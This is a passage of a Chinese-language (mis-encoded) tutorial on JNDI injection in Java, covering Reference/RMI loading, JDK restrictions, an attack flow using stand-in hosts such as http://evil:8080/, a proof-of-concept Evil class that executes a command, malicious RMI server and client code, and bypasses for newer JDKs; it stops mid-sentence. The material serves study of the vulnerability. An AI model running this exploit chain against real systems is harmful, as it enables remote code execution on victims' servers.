Javaä¸ºäº†å°†Objectå¯¹è±¡å­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæä¾›äº†Naming ReferenceåŠŸèƒ½ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡ç»‘å®šReferenceå­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæ¯”å¦‚RMIã€LDAPç­‰ã€‚ åœ¨ä½¿ç”¨Referenceæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å¯¹è±¡ä¼ å…¥æ„é€ æ–¹æ³•ä¸­ï¼Œå½“è¢«è°ƒç”¨æ—¶ï¼Œå¯¹è±¡çš„æ–¹æ³•å°±ä¼šè¢«è§¦å‘ï¼Œåˆ›å»ºReferenceå®ä¾‹æ—¶å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š classNameï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»åï¼› classFactoryï¼šåŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°ï¼› classFactoryLocationï¼šè¿œç¨‹åŠ è½½ç±»çš„åœ°å€ï¼Œæä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯file/ftp/httpç­‰åè®®ï¼› å½“ç„¶ï¼Œè¦æŠŠä¸€ä¸ªå¯¹è±¡ç»‘å®šåˆ°RMIæ³¨å†Œè¡¨ä¸­ï¼Œè¿™ä¸ªå¯¹è±¡éœ€è¦ç»§æ‰¿UnicastRemoteObjectï¼Œä½†æ˜¯Referenceæ²¡æœ‰ç»§æ‰¿å®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°è£…ä¸€ä¸‹å®ƒï¼Œç”¨ ReferenceWrapper åŒ…è£¹ä¸€ä¸‹Referenceå®ä¾‹å¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥å°†å…¶ç»‘å®šåˆ°RMIæ³¨å†Œè¡¨ï¼Œå¹¶è¢«è¿œç¨‹è®¿é—®åˆ°äº† // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å // ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦åŠ è½½çš„ç±»çš„å®Œæ•´ç±»å(è¿™ä¸¤ä¸ªå‚æ•°å¯èƒ½æœ‰ç‚¹è®©äººéš¾ä»¥ç¢ç£¨ï¼Œå¾€ä¸‹çœ‹ä½ å°±æ˜ç™½äº†ï¼‰ // ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯è¿œç¨‹classæ–‡ä»¶å­˜æ”¾çš„åœ°å€äº† Reference refObj = new Reference(\"refClassName\", \"insClassName\", \"http://example.com:8888/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); registry.bind(\"refObj\", refObjWrapper); å½“æœ‰å®¢æˆ·ç«¯é€šè¿‡lookup(\"refObj\")è·å–è¿œç¨‹å¯¹è±¡æ—¶ï¼Œè·å–çš„æ˜¯ä¸€ä¸ªReferenceå­˜æ ¹ï¼ˆStub),ç”±äºæ˜¯Referenceçš„å­˜æ ¹ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä¼šç°åœ¨æœ¬åœ°çš„classpathä¸­å»æ£€æŸ¥æ˜¯å¦å­˜åœ¨ç±»refClassNameï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å»æŒ‡å®šçš„urlï¼ˆhttp://example.com:8888/refClassName.classï¼‰åŠ¨æ€åŠ è½½ï¼Œå¹¶ä¸”è°ƒç”¨`insClassName`çš„**æ— å‚æ„é€ å‡½æ•°**ï¼Œæ‰€ä»¥**å¯ä»¥åœ¨æ„é€ å‡½æ•°é‡Œå†™æ¶æ„ä»£ç ã€‚å½“ç„¶é™¤äº†åœ¨æ— å‚æ„é€ å‡½æ•°ä¸­å†™åˆ©ç”¨ä»£ç ï¼Œè¿˜å¯ä»¥åˆ©ç”¨javaçš„ staticä»£ç å— æ¥å†™æ¶æ„ä»£ç ï¼Œå› ä¸ºstaticä»£ç å—çš„ä»£ç åœ¨classæ–‡ä»¶è¢«åŠ è½½è¿‡åå°±ä¼šç«‹å³æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚** äº†è§£æ›´å¤šå…³äºstaticä»£ç å—ï¼Œå‚è€ƒï¼šhttps://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html JNDIæ³¨å…¥ JNDIæ³¨å…¥åŸç† å°±æ˜¯å°†æ¶æ„çš„Referenceç±»ç»‘å®šåœ¨RMIæ³¨å†Œè¡¨ä¸­ï¼Œå…¶ä¸­æ¶æ„å¼•ç”¨æŒ‡å‘è¿œç¨‹æ¶æ„çš„classæ–‡ä»¶ï¼Œå½“ç”¨æˆ·åœ¨JNDIå®¢æˆ·ç«¯çš„lookup()å‡½æ•°å‚æ•°å¤–éƒ¨å¯æ§æˆ–Referenceç±»æ„é€ æ–¹æ³•çš„classFactoryLocationå‚æ•°å¤–éƒ¨å¯æ§æ—¶ï¼Œä¼šä½¿ç”¨æˆ·çš„JNDIå®¢æˆ·ç«¯è®¿é—®RMIæ³¨å†Œè¡¨ä¸­ç»‘å®šçš„æ¶æ„Referenceç±»ï¼Œä»è€ŒåŠ è½½è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ¶æ„classæ–‡ä»¶åœ¨å®¢æˆ·ç«¯æœ¬åœ°æ‰§è¡Œï¼Œæœ€ç»ˆå®ç°JNDIæ³¨å…¥æ”»å‡»å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ JNDIæ³¨å…¥çš„åˆ©ç”¨æ¡ä»¶ å®¢æˆ·ç«¯çš„lookup()æ–¹æ³•çš„å‚æ•°å¯æ§ æœåŠ¡ç«¯åœ¨ä½¿ç”¨Referenceç±»æ—¶ï¼ŒclassFactoryLocationå‚æ•°å¯æ§ ä¸Šé¢ä¸¤ä¸ªéƒ½æ˜¯åœ¨ç¼–å†™ç¨‹åºæ—¶å¯èƒ½å­˜åœ¨çš„è„†å¼±ç‚¹ï¼ˆä»»æ„ä¸€ä¸ªæ»¡è¶³å°±è¡Œï¼‰ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œjdkç‰ˆæœ¬åœ¨JNDIæ³¨å…¥ä¸­ä¹Ÿèµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ï¼Œè€Œä¸”ä¸åŒçš„æ”»å‡»Payloadå¯¹jdkçš„ç‰ˆæœ¬è¦æ±‚ä¹Ÿä¸ä¸€è‡´ï¼Œè¿™é‡Œå°±å…¨éƒ¨åˆ—å‡ºæ¥ï¼š JDK 6u45ã€7u21ä¹‹åï¼šjava.rmi.server.useCodebaseOnlyçš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºtrueã€‚å½“è¯¥å€¼ä¸ºtrueæ—¶ï¼Œå°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„java.rmi.server.codebaseæŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯JVMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚ JDK 6u141ã€7u131ã€8u121ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚ JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚ å¯ä»¥çœ‹å‡ºRMIçš„Codebaseé™åˆ¶æ˜æ˜¾æ¯”LDAPå¤šï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ—¥ç«™çš„æ—¶å€™ï¼Œæœ€å¥½ä¹Ÿæ˜¯ç”¨LDAPæ¥è¿›è¡Œæ³¨å…¥ã€‚ JNDIæ³¨å…¥æ”»å‡»æµç¨‹ æ”»å‡»è€…é€šè¿‡å¯æ§urlè§¦å‘åŠ¨æ€åè®®è½¬æ¢(rmi://attack:1090/Exploit) å—å®³è€…æœåŠ¡å™¨åŸä¸Šä¸‹æ–‡ç¯å¢ƒè¢«è½¬æ¢ä¸ºrmi://attack:1090/Exploit å—å®³è€…æœåŠ¡å™¨å»rmi://attack:1090/Exploitè¯·æ±‚ç»‘å®šå¯¹è±¡Exploitï¼Œæ”»å‡»è€…å®ç°å‡†å¤‡å¥½çš„RMIæœåŠ¡å™¨è¿”å›ä¸€ä¸ªReferenceWrapperå¯¹è±¡(Reference(\"Class1\",\"Class2\",\"http://evil:8080/\")) åº”ç”¨è·å–åˆ°ReferenceWrapperå¼€å§‹åœ¨æœ¬åœ°æŸ¥æ‰¾Class1ï¼Œå‘ç°æ— ï¼Œåˆ™å»è¯·æ±‚http://evil:8080/Class2.class webæœåŠ¡å™¨è¿”å›äº‹å…ˆå‡†å¤‡å¥½çš„æ¶æ„classæ–‡ä»¶ï¼Œå—å®³è€…æœåŠ¡å™¨è°ƒç”¨Class2çš„æ„é€ æ–¹æ³•ï¼Œæ¶æ„ä»£ç æ‰§è¡Œ JNDIæ³¨å…¥ä¸¾ä¾‹ åˆ›å»ºæ¶æ„ç±»Evilï¼ˆä¸èƒ½å¸¦packageï¼‰ import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.Hashtable; public class Evil implements ObjectFactory { // å®ç°æ¥å£ObjectFactoryï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œè™½ç„¶ä¸å½±å“æ‰§è¡Œ public Evil() throws IOException { // æ„é€ æ–¹æ³•ï¼ŒåŠ è½½æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ exec(\"open -na Calculator\"); } public static void exec(String cmd) throws IOException { Process runcmd = Runtime.getRuntime().exec(cmd); InputStreamReader inputStreamReader = new InputStreamReader(runcmd.getInputStream()); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String tmp; while ((tmp = bufferedReader.readLine()) != null){ System.out.println(tmp); } inputStreamReader.close(); bufferedReader.close(); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } å¸¸è§RMIæœåŠ¡ç«¯ï¼Œç»‘å®šæ¶æ„çš„Referenceåˆ°rmiæ³¨å†Œè¡¨ package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import javax.naming.Reference; import java.io.IOException; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class App { public static void main(String[] args) throws IOException, NamingException { //é…ç½®JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£ã€‚å¦‚æœæ²¡æœ‰é…ç½®è¿™äº›ä¿¡æ¯ï¼Œä¼šå‡ºç°NoInitialContextExceptionå¼‚å¸¸ Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL,\"rmi://127.0.0.1:1099\"); //åˆå§‹åŒ–ç¯å¢ƒ InitialContext ctx = new InitialContext(env); // åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨ LocateRegistry.createRegistry(1099); // ç»‘å®šæ¶æ„çš„Referenceåˆ°rmiæ³¨å†Œè¡¨ // æ³¨æ„ï¼ŒclassFactoryLocationåœ°å€åé¢ä¸€å®šè¦åŠ ä¸Š/ å¦‚æœä¸åŠ ä¸Š/ï¼Œé‚£ä¹ˆåˆ™å‘webæœåŠ¡è¯·æ±‚æ¶æ„å­—èŠ‚ç çš„æ—¶å€™ï¼Œåˆ™ä¼šæ‰¾ä¸åˆ°è¯¥å­—èŠ‚ç  Reference reference = new Reference(\"Evil\", \"Evil\", \"http://127.0.0.1:8888/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); ctx.bind(\"evil\", referenceWrapper); } } å®¢æˆ·ç«¯è¿œç¨‹è°ƒç”¨evilå¯¹åº”ç±» package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", String.valueOf(true)); // å‚è€ƒä¸Šé¢çš„åˆ©ç”¨æ¡ä»¶ï¼Œä½ç‰ˆæœ¬ä¸éœ€è¦è®¾ç½® System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", String.valueOf(true)); // å‚è€ƒä¸Šé¢çš„åˆ©ç”¨æ¡ä»¶ï¼Œä½ç‰ˆæœ¬ä¸éœ€è¦è®¾ç½® //åˆå§‹åŒ–ç¯å¢ƒ InitialContext init = new InitialContext(); // è¿œç¨‹è°ƒç”¨evilï¼Œç„¶åæ‰¾ä¸åˆ°æœåŠ¡ç«¯ç±»Evilï¼Œå°±ä¼šè°ƒç”¨http://127.0.0.1:8888/Evil.class init.lookup(\"rmi://127.0.0.1:1099/evil\"); } } æ­¥éª¤ å¯åŠ¨RMIæœåŠ¡ç«¯ ç¼–è¯‘Evil.javaä¸ºEvil.classï¼Œå¹¶å¯åŠ¨httpæœåŠ¡ å®¢æˆ·ç«¯è¿è¡Œï¼Œè¿œç¨‹è°ƒç”¨evil JNDIæ³¨å…¥Debug åœ¨lookupä¸‹æ–­ç‚¹è¿›è¡Œåˆ†æ å †æ ˆè°ƒç”¨æƒ…å†µ é¦–å…ˆè°ƒç”¨InitialContext.lookupï¼ŒgetURLOrDefaultInitCtxå‡½æ•°ä¼šåˆ†ænameçš„åè®®å¤´è¿”å›å¯¹åº”åè®®çš„ç¯å¢ƒå¯¹è±¡ï¼Œæ­¤å¤„è¿”å›Contextå¯¹è±¡çš„å­ç±»rmiURLContextå¯¹è±¡ï¼Œç„¶ååœ¨å¯¹åº”åè®®ä¸­å»lookupæœç´¢ ç„¶åå°±ä¼šè°ƒç”¨GenericURLContext.lookup()æ–¹æ³•ï¼Œæ­¤å¤„thisä¸ºrmiURLContextç±»è°ƒç”¨å¯¹åº”ç±»çš„getRootURLContextç±»ä¸ºè§£æRMIåœ°å€ï¼Œä¸åŒåè®®è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ ¹æ®ä¹‹å‰getURLOrDefaultInitCtx(name)è¿”å›å¯¹è±¡çš„ç±»å‹ä¸åŒï¼Œæ‰§è¡Œä¸åŒçš„getRootURLContextï¼Œè¿›å…¥ä¸åŒçš„åè®®è·¯çº¿ã€‚ public Object lookup(String var1) throws NamingException { // è·å–rmiæ³¨å†Œä¸­å¿ƒçš„ç›¸å…³æ•°æ® ResolveResult var2 = this.getRootURLContext(var1, this.myEnv); // è·å–æ³¨å†Œä¸­å¿ƒå¯¹è±¡ Context var3 = (Context)var2.getResolvedObj(); Object var4; try { // å»æ³¨å†Œä¸­å¿ƒlookupï¼Œè¿›å…¥æ­¤å¤„ lookup var4 = var3.lookup(var2.getRemainingName()); } finally { var3.close(); } return var4; } è·Ÿè¿›lookupï¼Œæ­¤å¤„è°ƒç”¨çš„æ˜¯RegistryContext.lookup() å…¶ä¸­ä»RMIæ³¨å†Œè¡¨ä¸­lookupæŸ¥è¯¢åˆ°æœåŠ¡ç«¯ä¸­ç›®æ ‡ç±»çš„Referenceåè¿”å›ä¸€ä¸ªReferenceWrapper_Stubç±»å®ä¾‹ï¼Œè¯¥ç±»å®ä¾‹å°±æ˜¯å®¢æˆ·ç«¯çš„å­˜æ ¹ã€ç”¨äºå®ç°å’ŒæœåŠ¡ç«¯è¿›è¡Œäº¤äº’ï¼Œæœ€åè°ƒç”¨decodeObject()å‡½æ•°æ¥è§£æ ç„¶åè·Ÿè¿›RegistryContext.decodeObjectï¼Œå…ˆåˆ¤æ–­å…¥å‚ReferenceWrapper_Stubç±»å®ä¾‹æ˜¯å¦æ˜¯RemoteReferenceæ¥å£å®ç°ç±»å®ä¾‹ï¼Œè€ŒReferenceWrapper_Stubç±»æ­£æ˜¯å®ç°RemoteReferenceæ¥å£ç±»çš„ï¼Œå› æ­¤é€šè¿‡åˆ¤æ–­è°ƒç”¨getReference()æ¥è·å–åˆ°ReferenceWrapper_Stubç±»å®ä¾‹ä¸­çš„Referenceå³æˆ‘ä»¬åœ¨æ¶æ„RMIæ³¨å†Œä¸­ç»‘å®šçš„æ¶æ„Referenceï¼›å†å¾€ä¸‹è°ƒç”¨NamingManager.getObjectInstance()æ¥è·å–è¿œç¨‹æœåŠ¡ç«¯ä¸Šçš„ç±»å®ä¾‹ ç»§ç»­è·ŸNamingManager.getObjectInstance() è¿›å…¥getObjectFactoryFromReferenceï¼Œåˆ°loadClass()æ—¶ï¼Œå°±ä¼šå‘å·¥å‚è¯·æ±‚æ¶æ„çš„class ç„¶åçœ‹åˆ°äº†ç†Ÿæ‚‰çš„newInstance()ï¼ˆå®ä¾‹åŒ–ï¼‰ï¼Œæƒ³æƒ³å†™çš„Evil.java åªæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ä¾‹åŒ–ä¹‹åï¼Œå°±ä¼šæ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„æ¶æ„ä»£ç ã€‚ å®ä¾‹åŒ–åï¼š ç»§ç»­è·Ÿï¼ŒgetObjectFactoryFromReference()è¿”å›çš„ç±»éœ€è¦ä¸ºObjectFactoryï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬çš„æ¶æ„ç±»è¦å®ç°ObjectFactoryè¿™ä¸ªæ¥å£ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“æ‰§è¡Œã€‚ ç»•è¿‡é«˜ç‰ˆæœ¬JDKï¼ˆ8u191+ï¼‰é™åˆ¶ å¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬JDKçš„é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥åˆ©ç”¨ ç»•è¿‡é«˜ç‰ˆæœ¬JDKï¼ˆ8u191+ï¼‰é™åˆ¶ Exploitng JNDI Injection In Java ç”±å‰é¢çŸ¥é“ï¼Œåœ¨JDK 6u211ã€7u201ã€8u191ã€11.0.1ä¹‹åï¼Œå¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚ ä¸¤ç§ç»•è¿‡æ–¹æ³•å¦‚ä¸‹ï¼š æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„Reference Factoryå·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„Factoryç±»æ‰§è¡Œå‘½ä»¤ã€‚ åˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–Gadgetå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚ è¿™ä¸¤ç§æ–¹å¼éƒ½éå¸¸ä¾èµ–å—å®³è€…æœ¬åœ°CLASSPATHä¸­ç¯å¢ƒï¼Œéœ€è¦åˆ©ç”¨å—å®³è€…æœ¬åœ°çš„Gadgetè¿›è¡Œæ”»å‡»ã€‚ ç®€å•åœ°è¯´ï¼Œåœ¨ä½ç‰ˆæœ¬JDKçš„JNDIæ³¨å…¥ä¸­ï¼Œä¸»è¦åˆ©ç”¨çš„å°±æ˜¯classFactoryLocationè¿™ä¸ªå‚æ•°æ¥å®ç°è¿œç¨‹åŠ è½½ç±»åˆ©ç”¨çš„ã€‚ä½†æ˜¯åœ¨é«˜ç‰ˆæœ¬JDKä¸­å¯¹classFactoryLocationè¿™ä¸ªé€”å¾„å®ç°äº†é™åˆ¶ï¼Œä½†æ˜¯å¯¹äºclassFactoryè¿™ä¸ªå‚æ•°å³æœ¬åœ°ClassPathä¸­å¦‚æœå­˜åœ¨Gadgetçš„è¯è¿˜æ˜¯èƒ½å¤Ÿè¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»çš„ã€‚ æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œç„¶åå†åˆ†æè¿™ä¸¤ç§ç»•è¿‡æ–¹æ³•ã€‚ å…³äºCodebase Oracleå®˜æ–¹å…³äºCodebaseçš„è¯´æ˜ï¼šhttps://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html CodebaseæŒ‡å®šäº†Javaç¨‹åºåœ¨ç½‘ç»œä¸Šè¿œç¨‹åŠ è½½ç±»çš„è·¯å¾„ã€‚RMIæœºåˆ¶ä¸­äº¤äº’çš„æ•°æ®æ˜¯åºåˆ—åŒ–å½¢å¼ä¼ è¾“çš„ï¼Œä½†æ˜¯ä¼ è¾“çš„åªæ˜¯å¯¹è±¡çš„æ•°æ®å†…å®¹ï¼ŒRMIæœ¬èº«å¹¶ä¸ä¼šä¼ é€’ç±»çš„ä»£ç ã€‚å½“æœ¬åœ°æ²¡æœ‰è¯¥å¯¹è±¡çš„ç±»å®šä¹‰æ—¶ï¼ŒRMIæä¾›äº†ä¸€äº›æ–¹æ³•å¯ä»¥è¿œç¨‹åŠ è½½ç±»ï¼Œä¹Ÿå°±æ˜¯RMIåŠ¨æ€åŠ è½½ç±»çš„ç‰¹æ€§ã€‚ å½“å¯¹è±¡å‘é€åºåˆ—åŒ–æ•°æ®æ—¶ï¼Œä¼šåœ¨åºåˆ—åŒ–æµä¸­é™„åŠ ä¸ŠCodebaseçš„ä¿¡æ¯ï¼Œè¿™ä¸ªä¿¡æ¯å‘Šè¯‰æ¥æ”¶æ–¹åˆ°ä»€ä¹ˆåœ°æ–¹å¯»æ‰¾è¯¥å¯¹è±¡çš„æ‰§è¡Œä»£ç ã€‚Codebaseå®é™…ä¸Šæ˜¯ä¸€ä¸ªURLè¡¨ï¼Œè¯¥URLä¸Šå­˜æ”¾äº†æ¥æ”¶æ–¹éœ€è¦çš„ç±»æ–‡ä»¶ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸Šé€šè¿‡å±æ€§ java.rmi.server.codebase æ¥è®¾ç½®Codebaseã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæ‰€éœ€çš„ç±»æ–‡ä»¶åœ¨Evilçš„æ ¹ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆè®¾ç½®Codebaseçš„å‘½ä»¤è¡Œå‚æ•°å¦‚ä¸‹ï¼ˆå¦‚æœä½ æŠŠç±»æ–‡ä»¶æ‰“åŒ…æˆäº†jarï¼Œé‚£ä¹ˆè®¾ç½®Codebaseæ—¶éœ€è¦æŒ‡å®šè¿™ä¸ªjaræ–‡ä»¶ï¼‰ï¼š -Djava.rmi.server.codebase=http://url:8080/ å½“æ¥æ”¶ç¨‹åºè¯•å›¾ä»è¯¥URLçš„Evilä¸Šä¸‹è½½ç±»æ–‡ä»¶æ—¶ï¼Œå®ƒä¼šæŠŠç±»çš„åŒ…åè½¬åŒ–æˆç›®å½•ï¼Œåœ¨Codebase çš„å¯¹åº”ç›®å½•ä¸‹æŸ¥è¯¢ç±»æ–‡ä»¶ï¼Œå¦‚æœä½ ä¼ é€’çš„æ˜¯ç±»æ–‡ä»¶ com.project.test ï¼Œé‚£ä¹ˆæ¥å—æ–¹å°±ä¼šåˆ°ä¸‹é¢çš„URLå»ä¸‹è½½ç±»æ–‡ä»¶ï¼š http://url:8080/com/project/test.class å…³äºJNDI Naming Referenceçš„é™åˆ¶ å¦‚å‰æ–‡æ‰€è¿°ï¼ŒJDK 7u21å¼€å§‹ï¼Œjava.rmi.server.useCodebaseOnly é»˜è®¤å€¼å°±ä¸ºtrueï¼Œé˜²æ­¢RMIå®¢æˆ·ç«¯VMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ã€‚ç„¶è€ŒJNDIæ³¨å…¥ä¸­çš„Reference Payloadå¹¶ä¸å—useCodebaseOnlyå½±å“ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ç”¨åˆ° RMI Class loadingï¼Œå®ƒæœ€ç»ˆæ˜¯é€šè¿‡URLClassLoaderåŠ è½½çš„è¿œç¨‹ç±»ã€‚ NamingManager.java static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class clas = null; // Try to use current class loader try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue // e.printStackTrace(); } // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } ä»£ç ä¸­ä¼šå…ˆå°è¯•åœ¨æœ¬åœ°CLASSPATHä¸­åŠ è½½ç±»ï¼Œä¸è¡Œå†ä»Codebaseä¸­åŠ è½½ï¼Œcodebaseçš„å€¼æ˜¯é€šè¿‡ref.getFactoryClassLocation()è·å¾—ã€‚ public Class loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException { ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); } æœ€åé€šè¿‡ VersionHelper12.loadClass() ä¸­ URLClassLoader åŠ è½½äº†è¿œç¨‹classã€‚æ‰€ä»¥java.rmi.server.useCodebaseOnlyä¸ä¼šé™åˆ¶JNDI Referenceçš„åˆ©ç”¨ï¼Œæœ‰å½±å“çš„æ˜¯é«˜ç‰ˆæœ¬JDKä¸­çš„è¿™å‡ ä¸ªç³»ç»Ÿå±æ€§ï¼š com.sun.jndi.rmi.object.trustURLCodebase com.sun.jndi.cosnaming.object.trustURLCodebase com.sun.jndi.ldap.object.trustURLCodebase åšä¸ªå®éªŒï¼Œæˆ‘ä»¬åœ¨JDK1.8.0_181ä¸‹ä½¿ç”¨ RMI Server æ„é€ æ¶æ„çš„JNDI Referenceè¿›è¡ŒJNDIæ³¨å…¥ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š Exception in thread \"main\" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) at javax.naming.InitialContext.lookup(InitialContext.java:417) è€Œæ­¤æ—¶ä½¿ç”¨LDAP Serverè¿”å›æ¶æ„Referenceæ˜¯å¯ä»¥æˆåŠŸåˆ©ç”¨çš„ï¼Œå› ä¸ºJDK 8u191ä»¥åæ‰å¯¹LDAP JNDI Referenceè¿›è¡Œäº†é™åˆ¶ã€‚ ç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶ï¼šåˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factory åœ¨é«˜ç‰ˆæœ¬ä¸­ï¼ˆå¦‚ï¼šJDK8u191ä»¥ä¸Šç‰ˆæœ¬ï¼‰è™½ç„¶ä¸èƒ½ä»è¿œç¨‹åŠ è½½æ¶æ„çš„Factoryï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åœ¨è¿”å›çš„Referenceä¸­æŒ‡å®šFactory Classï¼› è¿™ä¸ªå·¥å‚ç±»å¿…é¡»åœ¨å—å®³ç›®æ ‡æœ¬åœ°çš„CLASSPATHä¸­ å·¥å‚ç±»å¿…é¡»å®ç° javax.naming.spi.ObjectFactory æ¥å£ è‡³å°‘å­˜åœ¨ä¸€ä¸ª getObjectInstance() æ–¹æ³• org.apache.naming.factory.BeanFactory åˆšå¥½æ»¡è¶³æ¡ä»¶å¹¶ä¸”å­˜åœ¨è¢«åˆ©ç”¨çš„å¯èƒ½ã€‚org.apache.naming.factory.BeanFactory 